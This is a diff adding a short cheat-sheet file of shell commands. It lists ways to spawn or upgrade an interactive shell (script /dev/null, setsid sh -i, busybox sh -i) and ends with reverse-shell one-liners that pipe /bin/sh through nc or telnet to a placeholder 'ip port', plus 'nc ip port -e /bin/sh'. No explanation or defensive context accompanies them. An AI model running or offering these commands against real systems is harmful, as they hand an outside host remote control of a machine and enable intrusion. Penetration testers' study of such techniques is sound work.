@@ -1,0 +1,33 @@
+shell --pty
+shell -t
+
+==============
+shell
+busybox script -q /dev/null /bin/sh
+==============
+shell
+setsid sh -i
+==============
+shell
+busybox sh -i
+==============
+shell
+script /dev/null
+==============
+shell
+ash -i
+==============
+shell
+setsid ash
+
+
+script -q /dev/null /bin/sh
+script /dev/null -c /bin/sh
+
+
+mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | telnet ip port > /tmp/f
+mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ip port > /tmp/f
+
+nc ip port -e /bin/sh
+
+
